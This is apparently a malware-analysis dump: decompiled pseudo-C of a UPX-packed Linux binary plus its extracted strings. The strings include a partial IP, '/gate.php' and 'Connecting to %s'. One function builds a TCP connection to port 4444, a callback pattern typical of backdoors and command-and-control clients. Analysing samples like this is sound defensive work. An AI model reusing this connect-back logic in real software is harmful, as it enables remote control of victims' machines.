/* FUN_0010545d @ 0010545d */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0010545d(void)

{
                    /* WARNING: Could not recover jumptable at 0x00105461. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_001083c5)();
  return;
}



/* FUN_0010546d @ 0010546d */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0010546d(void)

{
                    /* WARNING: Could not recover jumptable at 0x00105471. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_00108375)();
  return;
}



/* FUN_0010547d @ 0010547d */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0010547d(void)

{
                    /* WARNING: Could not recover jumptable at 0x00105481. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_0010837d)();
  return;
}



/* FUN_0010548d @ 0010548d */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0010548d(void)

{
                    /* WARNING: Could not recover jumptable at 0x00105491. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_00108385)();
  return;
}



/* FUN_0010549d @ 0010549d */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0010549d(void)

{
                    /* WARNING: Could not recover jumptable at 0x001054a1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_0010838d)();
  return;
}



/* FUN_001054ad @ 001054ad */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001054ad(void)

{
                    /* WARNING: Could not recover jumptable at 0x001054b1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_00108395)();
  return;
}



/* FUN_001054bd @ 001054bd */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001054bd(void)

{
                    /* WARNING: Could not recover jumptable at 0x001054c1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_0010839d)();
  return;
}



/* FUN_001054fd @ 001054fd */

/* WARNING: Removing unreachable block (ram,0x00105510) */
/* WARNING: Removing unreachable block (ram,0x0010551c) */

void FUN_001054fd(void)

{
  return;
}



/* FUN_001055b6 @ 001055b6 */

void FUN_001055b6(void)

{
  long in_FS_OFFSET;
  undefined2 local_28;
  undefined2 local_26;
  undefined4 local_24;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_001054bd(2,1,0);
  FUN_0010549d(&local_28,0,0x10);
  local_28 = 2;
  local_26 = FUN_0010547d(0x115c);
  local_24 = FUN_001054ad(0x1063d5);
  FUN_0010548d(0x106404,0x1063e5);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    FUN_0010546d();
  }
  return;
}



/* FUN_00105659 @ 00105659 */

undefined8 FUN_00105659(void)

{
  FUN_001055b6();
  return 0;
}



/* entry @ 00105848 */

/* WARNING: Removing unreachable block (ram,0x00105871) */

void processEntry entry(void)

{
  undefined8 in_RCX;
  undefined1 extraout_DL;
  undefined7 extraout_var;
  long in_RSI;
  long in_RDI;
  undefined8 in_R8;
  undefined8 in_R9;
  
  FUN_00105ab8();
  FUN_001058bd(CONCAT71(extraout_var,extraout_DL),in_RDI,extraout_DL,0,in_R8,in_R9,in_RSI + in_RDI,
               CONCAT71(extraout_var,extraout_DL),in_RCX);
  return;
}



/* FUN_0010587f @ 0010587f */

void FUN_0010587f(undefined4 *param_1,undefined8 param_2,undefined8 param_3,uint param_4)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  undefined1 uVar3;
  ulong unaff_RBP;
  
  puVar2 = (undefined4 *)((long)param_1 + unaff_RBP);
  uVar3 = *(undefined1 *)puVar2;
  if ((5 < param_4) && (unaff_RBP < 0xfffffffffffffffd)) {
    do {
      param_4 = param_4 - 4;
      uVar1 = *puVar2;
      puVar2 = puVar2 + 1;
      *param_1 = uVar1;
      param_1 = param_1 + 1;
    } while (3 < param_4);
    uVar3 = *(undefined1 *)puVar2;
    if (param_4 == 0) {
      return;
    }
  }
  do {
    puVar2 = (undefined4 *)((long)puVar2 + 1);
    *(undefined1 *)param_1 = uVar3;
    param_4 = param_4 - 1;
    uVar3 = *(undefined1 *)puVar2;
    param_1 = (undefined4 *)((long)param_1 + 1);
  } while (param_4 != 0);
  return;
}



/* FUN_001058bd @ 001058bd */

long FUN_001058bd(uint *param_1,uint *param_2,undefined8 param_3,ulong param_4,char param_5,
                 undefined8 param_6,long param_7,int param_8,int *param_9)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint extraout_EDX;
  uint unaff_EBX;
  ulong unaff_RBP;
  uint *puVar5;
  byte bVar6;
  bool bVar7;
  byte bVar8;
  code *unaff_retaddr;
  
  puVar5 = param_1;
  if (param_5 != '\x02') {
LAB_00105953:
    *param_9 = (int)puVar5 - param_8;
    return (long)param_1 - param_7;
  }
  do {
    while( true ) {
      bVar8 = (byte)*param_2;
      bVar6 = CARRY4(unaff_EBX,unaff_EBX);
      unaff_EBX = unaff_EBX * 2;
      if (unaff_EBX == 0) {
        uVar3 = *param_2;
        bVar7 = param_2 < (uint *)0xfffffffffffffffc;
        param_2 = param_2 + 1;
        bVar6 = CARRY4(uVar3,uVar3) || CARRY4(uVar3 * 2,(uint)bVar7);
        unaff_EBX = uVar3 * 2 + (uint)bVar7;
        bVar8 = (byte)*param_2;
      }
      puVar5 = param_1;
      if (!(bool)bVar6) break;
      param_2 = (uint *)((long)param_2 + 1);
      *(byte *)param_1 = bVar8;
      param_1 = (uint *)((long)param_1 + 1);
    }
    do {
      iVar1 = (*unaff_retaddr)();
      uVar4 = (uint)param_4;
      uVar2 = iVar1 * 2 + (uint)bVar6;
      bVar6 = CARRY4(unaff_EBX,unaff_EBX);
      unaff_EBX = unaff_EBX * 2;
      uVar3 = extraout_EDX;
      if (unaff_EBX == 0) {
        uVar3 = *param_2;
        bVar7 = param_2 < (uint *)0xfffffffffffffffc;
        param_2 = param_2 + 1;
        bVar6 = CARRY4(uVar3,uVar3) || CARRY4(uVar3 * 2,(uint)bVar7);
        unaff_EBX = uVar3 * 2 + (uint)bVar7;
        uVar3 = (uint)(byte)*param_2;
      }
    } while (!(bool)bVar6);
    bVar8 = uVar2 < 3;
    if (!(bool)bVar8) {
      param_1 = (uint *)((long)param_2 + 1);
      bVar8 = false;
      uVar3 = ((uVar2 - 3) * 0x100 | uVar3 & 0xff) ^ 0xffffffff;
      if (uVar3 == 0) goto LAB_00105953;
      unaff_RBP = (ulong)(int)uVar3;
      param_2 = param_1;
    }
    (*unaff_retaddr)();
    bVar6 = CARRY4(uVar4,uVar4) || CARRY4(uVar4 * 2,(uint)bVar8);
    iVar1 = uVar4 * 2 + (uint)bVar8;
    uVar2 = (*unaff_retaddr)();
    uVar3 = iVar1 * 2 + (uint)bVar6;
    if (uVar3 == 0) {
      bVar8 = 0xfffffffd < uVar2;
      uVar3 = uVar2;
      do {
        uVar2 = (*unaff_retaddr)();
        uVar3 = uVar3 * 2 + (uint)bVar8;
        bVar8 = CARRY4(unaff_EBX,unaff_EBX);
        unaff_EBX = unaff_EBX * 2;
        if (unaff_EBX == 0) {
          uVar4 = *param_2;
          bVar7 = param_2 < (uint *)0xfffffffffffffffc;
          param_2 = param_2 + 1;
          bVar8 = CARRY4(uVar4,uVar4) || CARRY4(uVar4 * 2,(uint)bVar7);
          unaff_EBX = uVar4 * 2 + (uint)bVar7;
        }
      } while (!(bool)bVar8);
    }
    param_4 = (ulong)(uVar3 + uVar2 + (uint)(unaff_RBP < 0xfffffffffffff300));
    FUN_0010587f();
    param_1 = puVar5;
  } while( true );
}



/* FUN_00105a3c @ 00105a3c */

void FUN_00105a3c(void)

{
  uint uVar1;
  code *unaff_RBP;
  long unaff_retaddr;
  ulong local_20;
  long lStack_18;
  undefined8 uStack_10;
  undefined8 local_8;
  
  syscall();
  uVar1 = *(uint *)(unaff_retaddr + 0x13);
  lStack_18 = (long)(unaff_RBP + -0xb) - (ulong)*(uint *)(unaff_RBP + -0xb);
  uStack_10 = 2;
  syscall();
  local_8 = 9;
  local_20 = (ulong)*(uint *)(unaff_retaddr + 0x13);
  (*unaff_RBP)(unaff_retaddr + 0x1f,*(undefined4 *)(unaff_retaddr + 0x17),9,&local_20,
               *(undefined4 *)(unaff_retaddr + 0x1b),0);
  local_20 = 10;
  syscall();
  (*(code *)0x9)(local_8,uVar1,5,0x105ab5);
  return;
}



/* FUN_00105ab8 @ 00105ab8 */

/* WARNING: Control flow encountered bad instruction data */

void FUN_00105ab8(void)

{
  FUN_00105a3c();
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* ===== STRINGS (analist gorunumu) ===== */
tdoP7ydA
/lib64
nux-x86-
et_addr
__stack_ch
htons
c"r/m
mems'p/|
C_2/.5
_ITM_deregi]
lweTablecgm
192.0.
/gate.php
nnecting to %s
4`gp`
9*3$"
USQRH
PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $
_RPWQM)
j"AZR^j
/proc/self/exe
IuDSWH
XAVAWPH
D$ [I
UPX!u
slIT$}
}aw993u
([]A\A]
p(E1[$1
~*"|]
I5(Ag
=(I[u
A^A_)
m@S r6
JG=,1
RY?WVj,4
GCC: (Ubuntu 13.
=/cC2
@$Msa
Scrt1.o
__abi_tag
deregi
m_clones)do_g
tors9ux5omple)
d.0!_fin`array_e
me ummy2NX7`
_)t*sa
n7FRAME_END
GLOBAL_OFFSET_TABLE1_libc_
mZmax@&IBC_
E@ck[
fDlCh
pr2tf
ddr"gm\
dsvhand
d8_uYd
no.gnu.
BDd-id
dynogm
vEsio
(V.m#l
0sL>u
'?p`!